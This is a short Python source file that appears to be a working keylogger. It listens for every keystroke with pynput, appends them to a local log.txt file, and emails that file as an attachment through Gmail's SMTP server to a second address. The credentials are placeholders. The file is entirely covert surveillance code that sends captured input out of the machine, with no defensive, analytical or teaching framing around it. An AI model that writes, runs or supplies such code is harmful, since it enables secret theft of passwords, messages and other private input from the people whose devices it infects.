from pynput.keyboard import Listener
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders
from threading import Timer
from datetime import datetime

time_interval = 600
now = datetime.now()

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = 'SPACE'
    if key == 'Key.shift_r':
        key = 'SHIFT'
    if key == "Key.enter":
        key = '\n ENTER'

    with open("log.txt", 'a') as f:
        f.write(key)
    Timer(interval= time_interval,function= email).start()

def email():
    fromaddr = "Email1@gmail.com"
    toaddr = "Email2@gmail.com"
    
    msg = MIMEMultipart()   
    msg['From'] = fromaddr  
    msg['To'] = toaddr 
    msg['Subject'] = "Log file"
    body = now.strftime("%m/%d/%Y, %H:%M:%S")
    msg.attach(MIMEText(body, 'plain')) 
    filename = "log.txt"
    attachment = open("log.txt", "rb") 
    
    p = MIMEBase('application', 'octet-stream')  
    p.set_payload((attachment).read()) 
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p) 
    
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "Password") 
    text = msg.as_string() 
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

with Listener(on_press=log_keystroke) as l:
    l.join()